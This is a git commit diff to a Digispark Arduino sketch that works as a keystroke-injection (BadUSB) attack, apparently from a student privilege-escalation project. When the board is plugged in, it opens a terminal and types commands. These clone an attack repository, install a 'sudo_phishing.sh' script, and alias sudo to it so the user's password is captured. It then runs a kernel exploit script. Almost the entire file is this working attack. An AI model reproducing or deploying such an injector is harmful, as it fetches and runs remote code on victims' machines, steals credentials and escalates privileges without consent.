da73b666607b70b86b66ed85d0655ffcd50deba2
Jidnyesh <32982506+Jidnyesh@users.noreply.github.com>
2023-05-09 07:03:02 +0000

    Update keyboard.ino

--- keyboard.ino
+++ keyboard.ino
@@ -2,15 +2,34 @@
 void setup() {
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.delay(500);
-    DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
-    DigiKeyboard.delay(500);
-    DigiKeyboard.print("Terminal");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(KEY_T,MOD_CONTROL_LEFT|MOD_ALT_LEFT);
     DigiKeyboard.delay(1000);
-    DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git && cd Final-Project-Priv-Escalation/fake-sudo && chmod +x sudo_phishing.sh && cp sudo_phishing.sh /bin/sudo_phishing.sh && chmod 777 /bin/sudo_phishing.sh && echo \"alias sudo='/bin/sudo_phishing.sh'\" >> ~/.bash_aliases && source ~/.bash_aliases && . ~/.bash_aliases && cd ../Final-Project-Priv-Escalation/kernel-exploits && python main.py");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(4000);
+    DigiKeyboard.delay(2000);
+    DigiKeyboard.print("cd Final-Project-Priv-Escalation/fake-sudo");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("chmod +x sudo_phishing.sh"); 
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("cp sudo_phishing.sh /tmp/sudo_phishing.sh");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("chmod 777 /tmp/sudo_phishing.sh");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("echo \"alias sudo='/tmp/sudo_phishing.sh'\" >> ~/.bash_aliases");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+    DigiKeyboard.print("source ~/.bash_aliases");
+
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(". ~/.bash_aliases");
+        DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+    DigiKeyboard.print("cd ../kernel-exploits");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("python3 main.py");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(500);
+    
 
 }
 
